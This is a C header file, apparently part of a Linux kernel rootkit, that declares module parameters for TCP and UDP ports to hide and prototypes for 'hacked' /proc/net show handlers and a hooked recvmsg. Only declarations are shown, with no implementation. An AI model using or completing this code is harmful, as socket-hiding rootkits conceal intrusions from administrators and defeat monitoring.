#ifndef HIDESOCKET_H
#define HIDESOCKET_H

#include <net/tcp.h>
#include <net/udp.h>
#include <net/inet_sock.h>
#include <linux/inet_diag.h>
#include <linux/tcp.h>

#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <linux/delay.h>
#include <linux/string.h>
#include <linux/module.h>
#include <linux/moduleloader.h>
#include <linux/moduleparam.h>
#include <linux/reboot.h>
#include <linux/sched.h> 
#include <linux/init.h> 
#include <linux/kernel.h>


#include <linux/module.h>
#include <linux/init.h>
#include <linux/in.h>
#include <net/sock.h>
#include <linux/skbuff.h>
#include <linux/delay.h>
#include <linux/inet.h>
#include "include.h"

struct proc_dir_entry {
	unsigned int low_ino;
	umode_t mode;
	nlink_t nlink;
	kuid_t uid;
	kgid_t gid;
	loff_t size;
	const struct inode_operations *proc_iops;
	const struct file_operations *proc_fops;
	struct proc_dir_entry *parent;
	struct rb_root subdir;
	struct rb_node subdir_node;
	void *data;
	atomic_t count;         /* use count */
	atomic_t in_use;        /* number of callers into module in progress; */
	/* negative -> it's going away rsn */
	struct completion *pde_unload_completion;
	struct list_head pde_openers;   /* who did ->open, but not ->release */
	spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
	u8 namelen;
	char name[];
};



extern int udpPorts[10];
extern int udpNumPorts;
module_param_array(udpPorts, int, &udpNumPorts, 0000);
MODULE_PARM_DESC(tcpPorts, "An array of the udp Ports that should be hidden");
extern int tcpPorts[10];
extern int tcpNumPorts;
module_param_array(tcpPorts, int, &tcpNumPorts, 0000);
MODULE_PARM_DESC(tcpPorts, "An array of the tcp Ports that should be hidden");

size_t iov_size(const struct user_msghdr *msg);
bool checkTcpPort(int sport, int dport);
bool checkUdpPort(int sport, int dport);
asmlinkage int hacked_tcp_show (struct seq_file* sf, void * v);
asmlinkage int hacked_tcp6_show (struct seq_file* sf, void * v);
asmlinkage int hacked_udp_show (struct seq_file* sf, void * v);
asmlinkage int hacked_udp6_show (struct seq_file* sf, void * v);
bool checkNlm(struct nlmsghdr* nlm);
asmlinkage ssize_t hacked_recvmsg (int sockfd, struct user_msghdr __user *umsg, int flags);
int init_hide_socket(void);
void exit_hide_socket(void);

#endif
